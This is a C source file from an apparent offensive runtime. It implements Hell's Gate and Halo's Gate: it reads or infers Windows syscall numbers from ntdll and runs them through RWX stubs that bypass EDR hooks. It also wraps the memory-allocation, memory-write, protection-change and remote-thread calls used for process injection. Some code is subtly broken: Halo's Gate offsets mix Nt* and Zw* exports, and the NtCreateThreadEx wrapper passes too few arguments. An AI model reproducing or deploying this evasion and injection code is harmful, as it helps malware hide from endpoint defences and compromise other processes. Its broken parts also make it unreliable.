/*
 * Direct Syscalls: Hell's Gate + Halo's Gate
 *
 * jocky_get_syscall_number(name):
 *   Hell's Gate  – read SSN directly from the Zw* stub if unhooked.
 *   Halo's Gate  – if the stub is hooked (patched first bytes), scan
 *                  adjacent Zw* exports in sorted (= SSN) order to find
 *                  an unhooked neighbor and infer the target SSN by offset.
 *
 * jocky_direct_syscall(ssn, a1..a4):
 *   Allocates a one-shot RWX page containing the minimal stub:
 *     mov r10, rcx
 *     mov eax,  ssn
 *     syscall
 *     ret
 *   Then calls it via a typed function pointer so the C calling convention
 *   puts extra args (a5+) at the correct stack offsets for the Windows
 *   kernel (arg5 → [rsp+0x28], arg6 → [rsp+0x30]).
 *
 * Windows x64 only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

/* ── Syscall stub bytes ─────────────────────────────────────────────── */

#pragma pack(push, 1)
typedef struct {
    uint8_t  mov_r10_rcx[3]; /* 4C 8B D1 */
    uint8_t  mov_eax;        /* B8        */
    uint32_t ssn;            /* NN NN NN NN */
    uint8_t  syscall[2];     /* 0F 05     */
    uint8_t  ret;            /* C3        */
} syscall_stub_t;            /* 11 bytes  */
#pragma pack(pop)

static const syscall_stub_t STUB_TEMPLATE = {
    .mov_r10_rcx = { 0x4C, 0x8B, 0xD1 },
    .mov_eax     = 0xB8,
    .ssn         = 0,
    .syscall     = { 0x0F, 0x05 },
    .ret         = 0xC3,
};

/* Allocate a one-shot RWX stub for ssn.  Caller must VirtualFree after use. */
static void* alloc_stub(uint32_t ssn)
{
    syscall_stub_t* mem = (syscall_stub_t*)VirtualAlloc(NULL, 4096,
                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;

    memcpy(mem, &STUB_TEMPLATE, sizeof(STUB_TEMPLATE));
    mem->ssn = ssn;
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(STUB_TEMPLATE));
    return mem;
}

/* ── Hell's Gate + Halo's Gate ──────────────────────────────────────── */

/*
 * Extract the SSN from a function pointer assuming the standard Win10+ stub:
 *   4C 8B D1  mov r10, rcx
 *   B8 xx xx  mov eax, SSN
 */
static bool read_ssn_from_stub(const uint8_t* fn, uint32_t* out)
{
    /* Standard unhooked pattern */
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8) {
        *out = *(uint32_t*)(fn + 4);
        return true;
    }
    /* Some older/variant stubs start with: B8 xx xx xx xx (mov eax, ssn) */
    if (fn[0] == 0xB8) {
        *out = *(uint32_t*)(fn + 1);
        return true;
    }
    return false;
}

uint32_t jocky_get_syscall_number(const char* zw_name)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0xFFFFFFFF;

    FARPROC proc = GetProcAddress(hNtdll, zw_name);
    if (!proc) return 0xFFFFFFFF;

    /* ── Hell's Gate: direct read if unhooked ─── */
    uint32_t ssn = 0;
    if (read_ssn_from_stub((const uint8_t*)proc, &ssn))
        return ssn;

    /* ── Halo's Gate: hooked stub → infer from neighbor ─── */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(
        (BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hNtdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* fn_tbl   = (DWORD*)((BYTE*)hNtdll + exp->AddressOfFunctions);
    DWORD* name_tbl = (DWORD*)((BYTE*)hNtdll + exp->AddressOfNames);
    WORD*  ord_tbl  = (WORD*)((BYTE*)hNtdll + exp->AddressOfNameOrdinals);

    /* Locate our target in the names table (sorted alphabetically = SSN order) */
    int target_idx = -1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)hNtdll + name_tbl[i]);
        if (strcmp(name, zw_name) == 0) {
            target_idx = (int)i;
            break;
        }
    }
    if (target_idx < 0) return 0xFFFFFFFF;

    /* Scan up to 48 positions in each direction for an unhooked Zw* neighbor */
    for (int delta = 1; delta <= 48; delta++) {
        for (int sign = -1; sign <= 1; sign += 2) {
            int idx = target_idx + sign * delta;
            if (idx < 0 || (DWORD)idx >= exp->NumberOfNames) continue;

            /* Only consider Zw* functions (SSN assignment is monotone over them) */
            const char* neighbor_name = (const char*)((BYTE*)hNtdll + name_tbl[idx]);
            if (neighbor_name[0] != 'Z' || neighbor_name[1] != 'w') continue;

            const uint8_t* neighbor_fn =
                (const uint8_t*)((BYTE*)hNtdll + fn_tbl[ord_tbl[idx]]);
            uint32_t neighbor_ssn = 0;
            if (!read_ssn_from_stub(neighbor_fn, &neighbor_ssn)) continue;

            /* SSN = neighbor_ssn - (sign * delta):
             *   neighbor is delta ahead  (sign=+1) → our SSN = neighbor - delta
             *   neighbor is delta behind (sign=-1) → our SSN = neighbor + delta */
            int32_t derived = (int32_t)neighbor_ssn - (sign * delta);
            if (derived < 0) continue;
            return (uint32_t)derived;
        }
    }

    return 0xFFFFFFFF;
}

/* Convenience alias */
uint32_t jocky_get_syscall_num(const char* zw_name)
{
    return jocky_get_syscall_number(zw_name);
}

/* ── Generic direct syscall dispatcher ──────────────────────────────── */

/*
 * All variants share the same minimal stub.  The C calling convention puts
 * args 5+ at the correct [rsp+0x28], [rsp+0x30] offsets as viewed from
 * inside the syscall stub (the call instruction adds 8 bytes to RSP for
 * the return address, but that lines up correctly with Windows kernel
 * syscall arg expectations).
 */

intptr_t jocky_direct_syscall(uint32_t ssn,
                               uintptr_t a1, uintptr_t a2,
                               uintptr_t a3, uintptr_t a4)
{
    void* stub = alloc_stub(ssn);
    if (!stub) return -1;

    typedef intptr_t (*fn4_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    intptr_t result = ((fn4_t)stub)(a1, a2, a3, a4);

    VirtualFree(stub, 0, MEM_RELEASE);
    return result;
}

/* Kept for source compatibility with the old 6-arg variant name */
intptr_t jocky_direct_syscall4(uint32_t ssn,
                                uintptr_t a1, uintptr_t a2,
                                uintptr_t a3, uintptr_t a4)
{
    return jocky_direct_syscall(ssn, a1, a2, a3, a4);
}

/* ── Nt* convenience wrappers ───────────────────────────────────────── */

NTSTATUS jocky_nt_allocate_virtual_memory(HANDLE   process, PVOID*   base,
                                           ULONG_PTR zero_bits, PSIZE_T  region_size,
                                           ULONG    type,    ULONG    protect)
{
    uint32_t ssn = jocky_get_syscall_number("NtAllocateVirtualMemory");
    if (ssn == 0xFFFFFFFF) return (NTSTATUS)0xC0000002; /* NOT_IMPLEMENTED */

    void* stub = alloc_stub(ssn);
    if (!stub) return (NTSTATUS)0xC0000017; /* NO_MEMORY */

    typedef NTSTATUS (*fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS st = ((fn_t)stub)(process, base, zero_bits, region_size, type, protect);

    VirtualFree(stub, 0, MEM_RELEASE);
    return st;
}

NTSTATUS jocky_nt_protect_virtual_memory(HANDLE   process, PVOID*   base,
                                          PSIZE_T  region_size, ULONG    new_protect,
                                          PULONG   old_protect)
{
    uint32_t ssn = jocky_get_syscall_number("NtProtectVirtualMemory");
    if (ssn == 0xFFFFFFFF) return (NTSTATUS)0xC0000002;

    void* stub = alloc_stub(ssn);
    if (!stub) return (NTSTATUS)0xC0000017;

    typedef NTSTATUS (*fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS st = ((fn_t)stub)(process, base, region_size, new_protect, old_protect);

    VirtualFree(stub, 0, MEM_RELEASE);
    return st;
}

NTSTATUS jocky_nt_write_virtual_memory(HANDLE  process, PVOID   base,
                                        PVOID   buffer,  SIZE_T  size,
                                        PSIZE_T written)
{
    uint32_t ssn = jocky_get_syscall_number("NtWriteVirtualMemory");
    if (ssn == 0xFFFFFFFF) return (NTSTATUS)0xC0000002;

    void* stub = alloc_stub(ssn);
    if (!stub) return (NTSTATUS)0xC0000017;

    typedef NTSTATUS (*fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS st = ((fn_t)stub)(process, base, buffer, size, written);

    VirtualFree(stub, 0, MEM_RELEASE);
    return st;
}

NTSTATUS jocky_nt_create_thread(HANDLE*         thread_handle,
                                 ACCESS_MASK      desired_access,
                                 POBJECT_ATTRIBUTES obj_attrs,
                                 HANDLE           process,
                                 PVOID            start_routine,
                                 PVOID            argument,
                                 ULONG            create_flags,
                                 PULONG           thread_id)
{
    uint32_t ssn = jocky_get_syscall_number("NtCreateThreadEx");
    if (ssn == 0xFFFFFFFF) return (NTSTATUS)0xC0000002;

    void* stub = alloc_stub(ssn);
    if (!stub) return (NTSTATUS)0xC0000017;

    typedef NTSTATUS (*fn_t)(HANDLE*, ACCESS_MASK, POBJECT_ATTRIBUTES,
                             HANDLE, PVOID, PVOID, ULONG, PULONG);
    NTSTATUS st = ((fn_t)stub)(thread_handle, desired_access, obj_attrs,
                               process, start_routine, argument,
                               create_flags, thread_id);
    VirtualFree(stub, 0, MEM_RELEASE);
    return st;
}

#endif /* _WIN32 */
